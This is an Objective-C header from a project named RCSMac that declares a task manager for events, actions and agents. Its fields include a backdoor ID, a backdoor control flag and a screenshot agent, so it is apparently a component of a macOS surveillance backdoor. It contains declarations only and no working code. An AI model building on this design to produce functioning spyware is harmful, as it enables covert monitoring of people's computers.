/*
 * RCSMac - Task Manager
 *  This class will be responsible for managing all the operations within
 *  Events/Actions/Agents, thus the Core will have to deal with them in the
 *  most generic way.
 * 
 *
 * Created by Alfredo 'revenge' Pesoli on 10/04/2009
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <Cocoa/Cocoa.h>

#ifndef __RCSMTaskManager_h__
#define __RCSMTaskManager_h__

//
// Events
//
#define EVENT_TIMER       0x0000
#define EVENT_PROCESS     0x0001
#define EVENT_CONNECTION  0x0002
#define EVENT_SCREENSAVER 0x0003
#define EVENT_SYSLOG      0x0004
#define EVENT_QUOTA       0x0005

//
// Actions
//
#define ACTION_SYNC         0x0001
#define ACTION_AGENT_START  0x0002
#define ACTION_AGENT_STOP   0x0003
#define ACTION_EXECUTE      0x0004
#define ACTION_UNINSTALL    0x0005
#define ACTION_INFO         0x0006

@class RCSMConfManager;
@class RCSMEvents;
@class RCSMActions;
@class RCSMAgentScreenshot;
@class RCSMSharedMemory;
@class RCSMLogManager;

//
// This class is a singleton
//
@interface RCSMTaskManager : NSObject
{
@private
  NSMutableArray *mEventsList;
  NSMutableArray *mActionsList;
  NSMutableArray *mAgentsList;

@private
  int mBackdoorID;
  NSString *mBackdoorControlFlag;
  BOOL mShouldReloadConfiguration;
  BOOL mIsSyncing;
  
@private
  RCSMConfManager   *mConfigManager;
  RCSMActions       *mActions;
}

//@property (readonly, retain) NSMutableArray *mEventsList;
//@property (readonly, retain) NSMutableArray *mActionsList;
//@property (readonly, retain) NSMutableArray *mAgentsList;
@property (readwrite)        int mBackdoorID;
@property (readwrite, copy)  NSString *mBackdoorControlFlag;
@property (readwrite)        BOOL mShouldReloadConfiguration;

+ (RCSMTaskManager *)sharedInstance;
+ (id)allocWithZone: (NSZone *)aZone;
- (id)copyWithZone: (NSZone *)aZone;
- (id)init;
- (id)retain;
- (unsigned)retainCount;
- (void)release;
- (id)autorelease;

- (BOOL)loadInitialConfiguration;
- (BOOL)updateConfiguration: (NSMutableData *)aConfigurationData;
- (BOOL)reloadConfiguration;
- (void)uninstallMeh;

- (id)initAgent: (u_int)agentID;
- (BOOL)startAgent: (u_int)agentID;
- (BOOL)restartAgent: (u_int)agentID;
- (BOOL)suspendAgent: (u_int)agentID;
- (BOOL)stopAgent: (u_int)agentID;

- (BOOL)startAgents;
- (BOOL)stopAgents;

- (void)eventsMonitor;
- (BOOL)stopEvents;

- (BOOL)triggerAction: (int)anActionID;

- (BOOL)registerEvent: (NSData *)eventData
                 type: (u_int)aType
               action: (u_int)actionID;
- (BOOL)unregisterEvent: (u_int)eventID;
- (BOOL)registerAction: (NSData *)actionData
                  type: (u_int)actionType
                action: (u_int)actionID;
- (BOOL)unregisterAction: (u_int)actionID;
- (BOOL)registerAgent: (NSData *)agentData
              agentID: (u_int)agentID
               status: (u_int)status;
- (BOOL)unregisterAgent: (u_int)agentID;

- (NSArray *)eventsList;
- (NSArray *)actionsList;
- (NSArray *)agentsList;

//- (NSMutableDictionary *)getEvent: (u_int)anEventType;
- (NSMutableDictionary *)getConfigForAction: (u_int)anActionID;
- (NSMutableDictionary *)getConfigForAgent:  (u_int)anAgentID;

- (void)removeAllElements;

- (NSString *)getControlFlag;
@end

#endif